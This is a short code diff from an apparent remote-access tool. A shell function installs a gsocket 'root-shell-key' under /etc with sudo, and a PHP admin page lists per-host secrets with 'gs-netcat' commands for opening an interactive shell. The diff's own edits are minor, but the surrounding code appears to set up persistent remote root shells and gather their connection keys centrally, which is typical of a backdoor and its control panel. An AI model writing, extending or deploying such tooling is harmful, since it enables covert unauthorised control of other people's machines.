@@ -396,7 +396,7 @@ setup_gsocket() {
     
     if [ -n "$SECRET" ]; then
         echo "Secret extracted: [HIDDEN]" >> "$LOG_FILE"
-        echo "$SECRET" > "$TEMP_DIR/gsocket_secret.txt"
+        echo "$SECRET" | sort -u > "$TEMP_DIR/gsocket_secret.txt"
         
         log_cmd "sudo mkdir -p /etc/gsocket" "Creating gsocket configuration directory" "$LOG_FILE"
         log_cmd "echo '$SECRET' | sudo tee /etc/gsocket/root-shell-key.txt > /dev/null" "Saving gsocket secret key" "$LOG_FILE"
@@ -837,7 +837,7 @@ if ($authenticated && !isset($_COOKIE['admin_auth'])) {
             echo "<h2>$type Secret for $hostname</h2>";
             echo "<div class='secret'>$secret</div>";
             echo "<p>To connect using gsocket:</p>";
-            echo "<div class='logs'>gs-netcat -s \"$secret\"</div>";
+            echo "<div class='logs'>gs-netcat -s \"$secret\" -i</div>";
         }
     }
     ?>
